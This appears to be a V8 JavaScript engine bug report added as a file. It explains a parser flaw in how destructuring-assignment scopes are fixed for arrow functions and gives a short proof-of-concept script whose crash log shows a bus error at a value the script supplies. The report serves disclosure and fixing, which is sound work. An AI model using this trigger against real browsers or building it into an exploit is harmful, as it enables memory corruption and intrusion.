@@ -1,0 +1,41 @@
+/*
+When the parser parses the parameter list of an arrow function contaning destructuring assignments, it can't distinguish whether the assignments will be actually in the parameter list or just assignments until it meets a "=>" token. So it first assigns the destructuring assignments to the outer scope, and fixs the scope when it meets the "=>" token.
+
+Here's the methods used to fix the scope (https://cs.chromium.org/chromium/src/v8/src/parsing/parser-base.h?rcl=787ecbb389741d2b76131f9fa526374a0dbfcff6&l=407).
+
+    void RewindDestructuringAssignments(int pos) {
+      destructuring_assignments_to_rewrite_.Rewind(pos);
+    }
+
+    void SetDestructuringAssignmentsScope(int pos, Scope* scope) {
+      for (int i = pos; i < destructuring_assignments_to_rewrite_.length();
+           ++i) {
+        destructuring_assignments_to_rewrite_[i]->set_scope(scope);
+      }
+    }
+
+Since the SetDestructuringAssignmentsScope method changes the scope from "pos" to the end of the list, it needs to call the RewindDestructuringAssignments method after fixing the scope. But the RewindDestructuringAssignments method is only called when the arrow function's body starts with a "{" token (https://cs.chromium.org/chromium/src/v8/src/parsing/parser-base.h?rcl=787ecbb389741d2b76131f9fa526374a0dbfcff6&l=4418).
+
+So it can't properly handle the following case where a destructuring assignment expression containing a single line arrow function. It will set the scope of the inner destructuring assignments to the outer arrow function's scope.
+
+PoC:
+*/
+
+(({a = (async ({b = {a = c} = {
+    a: 0x1234
+}}) => 1)({})}, c) => 1)({});
+
+/*
+Log:
+Received signal 10 BUS_ADRERR 12340000001f
+
+==== C stack trace ===============================
+
+ [0x00010edde85e]
+ [0x7fff53e54f5a]
+ [0x000000000000]
+ [0x7eb48331b6d8]
+ [0x7eb48331b6d8]
+[end of stack trace]
+Bus error: 10
+*/
